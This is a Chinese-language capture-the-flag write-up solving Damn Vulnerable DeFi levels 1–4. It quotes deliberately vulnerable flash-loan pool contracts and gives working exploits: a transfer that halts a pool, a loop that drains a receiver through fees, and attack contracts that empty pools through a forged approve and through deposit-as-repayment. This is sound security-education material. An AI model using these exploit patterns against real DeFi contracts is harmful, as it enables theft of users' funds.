# Damn Defi靶场刷题记录(1-4)

    author: Thomas_Xu

## 1 Unstoppable
这一关没有什么太大的难度，主要是带领进入Damn的题目

这道题是想让我们让这个闪电贷池停止工作

我们首先看一下合约
```
 // SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

interface IReceiver {
    function receiveTokens(address tokenAddress, uint256 amount) external;
}

/**
 * @title UnstoppableLender
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract UnstoppableLender is ReentrancyGuard {

    IERC20 public immutable damnValuableToken;
    uint256 public poolBalance;

    constructor(address tokenAddress) {
        require(tokenAddress != address(0), "Token address cannot be zero");
        damnValuableToken = IERC20(tokenAddress);
    }

    function depositTokens(uint256 amount) external nonReentrant {
        require(amount > 0, "Must deposit at least one token");
        // Transfer token from sender. Sender must have first approved them.
        damnValuableToken.transferFrom(msg.sender, address(this), amount);
        poolBalance = poolBalance + amount;
    }

    function flashLoan(uint256 borrowAmount) external nonReentrant {
        require(borrowAmount > 0, "Must borrow at least one token");

        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        // Ensured by the protocol via the `depositTokens` function
        assert(poolBalance == balanceBefore);
        
        damnValuableToken.transfer(msg.sender, borrowAmount);
        
        IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);
        
        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }
}
```
可以注意到这个闪电贷函数是有明显问题的
`assert(poolBalance == balanceBefore);`这个判断不严谨，poolBalance只有在调用depositTokens()函数存款时，才会增加，而如果我们通过ERC20的transfer来转账，balanceBefore余额会增加，但poolBalance并没有改变，这就会造成此闪电贷池宕机。

 * 解题步骤：
 我们只需要向该合约提交一笔转账即可
 `await this.token.transfer(this.pool.address, INITIAL_ATTACKER_BALANCE, { from: attacker} );`
 

 ## 2 naive-reciever
 先看合约
 ```
 contract NaiveReceiverLenderPool is ReentrancyGuard {
    using SafeMath for uint256;
    using Address for address;

    uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan

    function fixedFee() external pure returns (uint256) {
        return FIXED_FEE;
    }

    function flashLoan(address payable borrower, uint256 borrowAmount) external nonReentrant {

        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= borrowAmount, "Not enough ETH in pool");


        require(address(borrower).isContract(), "Borrower must be a deployed contract");
        // Transfer ETH and handle control to receiver
        (bool success, ) = borrower.call{value: borrowAmount}(
            abi.encodeWithSignature(
                "receiveEther(uint256)",
                FIXED_FEE
            )
        );
        require(success, "External call failed");

        require(
            address(this).balance >= balanceBefore.add(FIXED_FEE),
            "Flash loan hasn't been paid back"
        );
    }

    // Allow deposits of ETH
    receive () external payable {}
}
 ```
 * **分析**
 这个flashloan函数只要被调用一次就会抽取1ETH的小费，在这种时候，接收器必须要判断消息的发送者是否为自己，否则任何人都可以冒充接收器发送闪电贷请求。导致自己token的流失。

* **Exploit**
只需要循环调用flashloan函数即可
```
for(let i = 0; i < 10; i++){
            await this.pool.connect(attacker).flashLoan(this.receiver.address, "0");
        }
```

## 3 Truster
这又是一个关于外部调用的一个漏洞
先看代码
```
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TrusterLenderPool is ReentrancyGuard {

    using Address for address;

    IERC20 public immutable damnValuableToken;

    constructor (address tokenAddress) {
        damnValuableToken = IERC20(tokenAddress);
    }

    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
        external
        nonReentrant
    {
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
        
        damnValuableToken.transfer(borrower, borrowAmount);
        target.functionCall(data);

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }

}

```
* **分析**
`ReentrancyGuard`并不是能让你安枕无忧的防止外部调用的方法，在这种特定情况下，最大的问题是允许指定与借款人合同不同的呼叫目标。
* **Exploit**
我们注意到在此合约中指定了token地址，那么我们就可以获取到此token地址，通过借入的漏洞冒充pool池`approve`给我们一笔巨款，随后我们就可以把approve的这部分token拿到手。
攻击合约如下
```
pragma solidity ^0.8.0;
import "./TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITrusterLenderPool{
    function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data) external;
}

contract TrusterExploit{
    ITrusterLenderPool cons;
    uint256 balanceOfPool;
    address tokenAdr;
    address poolAdr;
    constructor(address _pool, uint256 BalanceOfPool, address _token){
        cons = ITrusterLenderPool(_pool);
        poolAdr = _pool;
        balanceOfPool = BalanceOfPool;
        tokenAdr = _token;
    }
    function attack() public {
        cons.flashLoan(0, msg.sender, tokenAdr, abi.encodeWithSignature("approve(address,uint256)", address(this), balanceOfPool));
        IERC20 token = IERC20(tokenAdr);
        token.transferFrom(poolAdr, msg.sender,balanceOfPool);
    }
}
```
```
  it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        const attackconst = await ethers.getContractFactory('TrusterExploit', attacker);
        this.exploit = await attackconst.deploy(this.pool.address, TOKENS_IN_POOL, this.token.address);
        await this.exploit.connect(attacker).attack();
        
    });
```

## 4 side-entrance
先看代码
```
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */

contract SideEntranceLenderPool {
    using Address for address payable;

    mapping (address => uint256) private balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).sendValue(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Not enough ETH in balance");
        
        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");    
    }
}
```
* **分析**
通过阅读代码，我们可以明显的发现此题的flashloan的判断后缀条件有机可乘`require(address(this).balance >= balanceBefore`这里检查的是当前合约的余额，而不是检查的借贷池里的余额，这导致我们可以通过存款`deposit`来伪造我们已经还款的事件。我们只需要在`receiver`里面存款，就可以使我们的balance不断增加。最后提款即可

* **Expolit**
根据分析写出攻击合约：
```
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

// interface IFlashLoanEtherReceiver {
//     function execute() external payable;
// }

contract SideEntranceExploit is IFlashLoanEtherReceiver{
    SideEntranceLenderPool pool;
    address payable attacker;
    constructor(address _pool){
        pool = SideEntranceLenderPool(_pool);
        attacker = payable(msg.sender);
    }

    function attack(uint256 _amount) public{
        pool.flashLoan(_amount);
        pool.withdraw();
    }

    function execute() external payable override {
        pool.deposit{value:address(this).balance}();
    }
    
    receive() external payable{
        attacker.transfer(address(this).balance);
    }
}
```

```
it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const sideEnranceExploit = await ethers.getContractFactory('SideEntranceExploit', attacker);
        this.exploit = await sideEnranceExploit.deploy(this.pool.address);
        await this.exploit.connect(attacker).attack(ETHER_IN_POOL);
    });
```

